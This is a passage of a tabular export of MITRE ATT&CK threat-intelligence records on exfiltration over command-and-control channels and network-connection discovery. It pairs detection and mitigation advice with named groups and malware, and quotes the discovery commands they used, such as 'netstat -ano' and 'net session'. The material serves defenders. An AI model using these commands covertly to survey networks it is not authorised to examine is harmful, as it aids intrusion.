768,"['Detection for command and control applies. Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['User interface', 'Process monitoring']",['[[Software/S0034|NETEAGLE]] is capable of reading files over the C2 channel.[[CiteRef::FireEye APT30]]'],['APT30'],['APT30'],['G0013'],"['Mitigations for command and control apply. Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool command and control signatures over time or construct protocols in such a way to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: NETEAGLE,['Exfiltration'],['Technique/T1041'],['Exfiltration Over Command and Control Channel'],https://attack.mitre.org/wiki/Technique/T1041
769,"['Detection for command and control applies. Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['User interface', 'Process monitoring']","['After data is collected by [[Group/G0038|Stealth Falcon]] malware, it is exfiltrated over the existing C2 channel.[[CiteRef::Citizen Lab Stealth Falcon May 2016]]']",['Stealth Falcon'],['Stealth Falcon'],['G0038'],"['Mitigations for command and control apply. Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool command and control signatures over time or construct protocols in such a way to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],[],['Exfiltration'],['Technique/T1041'],['Exfiltration Over Command and Control Channel'],https://attack.mitre.org/wiki/Technique/T1041
770,"['Detection for command and control applies. Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['User interface', 'Process monitoring']",['[[Group/G0032|Lazarus Group]] malware IndiaIndia saves information gathered about the victim to a file that is uploaded to one of its 10 C2 servers.[[CiteRef::Novetta Blockbuster Loaders]]'],['Lazarus Group'],"['Lazarus Group', 'HIDDEN COBRA', 'Guardians of Peace']",['G0032'],"['Mitigations for command and control apply. Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool command and control signatures over time or construct protocols in such a way to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],[],['Exfiltration'],['Technique/T1041'],['Exfiltration Over Command and Control Channel'],https://attack.mitre.org/wiki/Technique/T1041
771,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['Process command-line parameters', 'Process monitoring']",['Commands such as <code>net use</code> and <code>net session</code> can be used in [[Software/S0039|Net]] to gather information about network connections from a particular host.[[CiteRef::Savill 1999]]'],['Deep Panda'],"['Deep Panda', 'Shell Crew', 'WebMasters', 'KungFu Kittens', 'PinkPanther', 'Black Vine']",['G0009'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about network connections, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator']",[],"Software: Net, net.exe",['Discovery'],['Technique/T1049'],['System Network Connections Discovery'],https://attack.mitre.org/wiki/Technique/T1049
772,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['Process command-line parameters', 'Process monitoring']",['[[Software/S0125|Remsec]] can obtain a list of active connections and open ports.[[CiteRef::Kaspersky ProjectSauron Technical Analysis]]'],['Strider'],"['Strider', 'ProjectSauron']",['G0041'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about network connections, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator']",[],"Software: Remsec, Backdoor.Remsec, ProjectSauron",['Discovery'],['Technique/T1049'],['System Network Connections Discovery'],https://attack.mitre.org/wiki/Technique/T1049
773,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['Process command-line parameters', 'Process monitoring']",['Commands such as <code>net use</code> and <code>net session</code> can be used in [[Software/S0039|Net]] to gather information about network connections from a particular host.[[CiteRef::Savill 1999]]'],['Ke3chang'],['Ke3chang'],['G0004'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about network connections, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator']",[],"Software: Net, net.exe",['Discovery'],['Technique/T1049'],['System Network Connections Discovery'],https://attack.mitre.org/wiki/Technique/T1049
774,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['Process command-line parameters', 'Process monitoring']","['[[Software/S0104|netstat]] can be used to enumerate local network connections, including active TCP connections and other network statistics.[[CiteRef::TechNet Netstat]]']",['Ke3chang'],['Ke3chang'],['G0004'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about network connections, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator']",[],"Software: netstat, netstat.exe",['Discovery'],['Technique/T1049'],['System Network Connections Discovery'],https://attack.mitre.org/wiki/Technique/T1049
775,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['Process command-line parameters', 'Process monitoring']",['[[Group/G0004|Ke3chang]] performs local network connection discovery using <code>netstat -ano</code> commands.[[CiteRef::Villeneuve et al 2014]]'],['Ke3chang'],['Ke3chang'],['G0004'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about network connections, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator']",[],[],['Discovery'],['Technique/T1049'],['System Network Connections Discovery'],https://attack.mitre.org/wiki/Technique/T1049
776,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['Process command-line parameters', 'Process monitoring']",['Commands such as <code>net use</code> and <code>net session</code> can be used in [[Software/S0039|Net]] to gather information about network connections from a particular host.[[CiteRef::Savill 1999]]'],['APT1'],"['APT1', 'Comment Crew', 'Comment Group', 'Comment Panda']",['G0006'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about network connections, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator']",[],"Software: Net, net.exe",['Discovery'],['Technique/T1049'],['System Network Connections Discovery'],https://attack.mitre.org/wiki/Technique/T1049
777,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['Process command-line parameters', 'Process monitoring']","['[[Software/S0104|netstat]] can be used to enumerate local network connections, including active TCP connections and other network statistics.[[CiteRef::TechNet Netstat]]']",['Turla'],"['Turla', 'Waterbug']",['G0010'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about network connections, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator']",[],"Software: netstat, netstat.exe",['Discovery'],['Technique/T1049'],['System Network Connections Discovery'],https://attack.mitre.org/wiki/Technique/T1049
778,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['Process command-line parameters', 'Process monitoring']",['Commands such as <code>net use</code> and <code>net session</code> can be used in [[Software/S0039|Net]] to gather information about network connections from a particular host.[[CiteRef::Savill 1999]]'],['Turla'],"['Turla', 'Waterbug']",['G0010'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about network connections, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator']",[],"Software: Net, net.exe",['Discovery'],['Technique/T1049'],['System Network Connections Discovery'],https://attack.mitre.org/wiki/Technique/T1049
779,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['Process command-line parameters', 'Process monitoring']",['[[Software/S0102|nbtstat]] can be used to discover current NetBIOS sessions.'],['Turla'],"['Turla', 'Waterbug']",['G0010'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about network connections, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator']",[],"Software: nbtstat, nbtstat.exe",['Discovery'],['Technique/T1049'],['System Network Connections Discovery'],https://attack.mitre.org/wiki/Technique/T1049
780,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['Process command-line parameters', 'Process monitoring']","['[[Group/G0010|Turla]] surveys a system upon check-in to discover active local network connections using the <code>netstat -an</code>, <code>net use</code>, <code>net file</code>, and <code>net session</code> commands.[[CiteRef::Kaspersky Turla]]']",['Turla'],"['Turla', 'Waterbug']",['G0010'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about network connections, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator']",[],[],['Discovery'],['Technique/T1049'],['System Network Connections Discovery'],https://attack.mitre.org/wiki/Technique/T1049
781,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['Process command-line parameters', 'Process monitoring']",['[[Software/S0089|BlackEnergy]] has gathered information about local network connections using [[Software/S0104|netstat]].[[CiteRef::F-Secure BlackEnergy 2014]][[CiteRef::Securelist BlackEnergy Nov 2014]]'],['Sandworm Team'],"['Sandworm Team', 'Quedagh']",['G0034'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about network connections, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator']",[],"Software: BlackEnergy, Black Energy",['Discovery'],['Technique/T1049'],['System Network Connections Discovery'],https://attack.mitre.org/wiki/Technique/T1049
782,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['Process command-line parameters', 'Process monitoring']",['Commands such as <code>net use</code> and <code>net session</code> can be used in [[Software/S0039|Net]] to gather information about network connections from a particular host.[[CiteRef::Savill 1999]]'],['Threat Group-1314'],"['Threat Group-1314', 'TG-1314']",['G0028'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about network connections, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator']",[],"Software: Net, net.exe",['Discovery'],['Technique/T1049'],['System Network Connections Discovery'],https://attack.mitre.org/wiki/Technique/T1049
783,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['Process command-line parameters', 'Process monitoring']",['Commands such as <code>net use</code> and <code>net session</code> can be used in [[Software/S0039|Net]] to gather information about network connections from a particular host.[[CiteRef::Savill 1999]]'],['Naikon'],['Naikon'],['G0019'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about network connections, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator']",[],"Software: Net, net.exe",['Discovery'],['Technique/T1049'],['System Network Connections Discovery'],https://attack.mitre.org/wiki/Technique/T1049
784,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['Process command-line parameters', 'Process monitoring']",['Commands such as <code>net use</code> and <code>net session</code> can be used in [[Software/S0039|Net]] to gather information about network connections from a particular host.[[CiteRef::Savill 1999]]'],['admin@338'],['admin@338'],['G0018'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about network connections, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator']",[],"Software: Net, net.exe",['Discovery'],['Technique/T1049'],['System Network Connections Discovery'],https://attack.mitre.org/wiki/Technique/T1049
785,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['Process command-line parameters', 'Process monitoring']","['[[Software/S0104|netstat]] can be used to enumerate local network connections, including active TCP connections and other network statistics.[[CiteRef::TechNet Netstat]]']",['admin@338'],['admin@338'],['G0018'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about network connections, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator']",[],"Software: netstat, netstat.exe",['Discovery'],['Technique/T1049'],['System Network Connections Discovery'],https://attack.mitre.org/wiki/Technique/T1049
786,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['Process command-line parameters', 'Process monitoring']",['[[Group/G0018|admin@338]] actors used the following command following exploitation of a machine with [[Software/S0042|LOWBALL]] malware to display network connections: <code>netstat -ano >> %temp%\\download</code>[[CiteRef::FireEye admin@338]]'],['admin@338'],['admin@338'],['G0018'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about network connections, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator']",[],[],['Discovery'],['Technique/T1049'],['System Network Connections Discovery'],https://attack.mitre.org/wiki/Technique/T1049
787,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['Process command-line parameters', 'Process monitoring']",['[[Group/G0033|Poseidon Group]] obtains and saves information about victim network interfaces and addresses.[[CiteRef::Kaspersky Poseidon Group]]'],['Poseidon Group'],['Poseidon Group'],['G0033'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about network connections, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator']",[],[],['Discovery'],['Technique/T1049'],['System Network Connections Discovery'],https://attack.mitre.org/wiki/Technique/T1049
788,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['Process command-line parameters', 'Process monitoring']",['[[Software/S0063|SHOTPUT]] uses [[Software/S0104|netstat]] to list TCP connection status.[[CiteRef::Palo Alto CVE-2015-3113 July 2015]]'],['APT3'],"['APT3', 'Gothic Panda', 'Pirpi', 'UPS Team', 'Buckeye', 'Threat Group-0110', 'TG-0110']",['G0022'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about network connections, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands 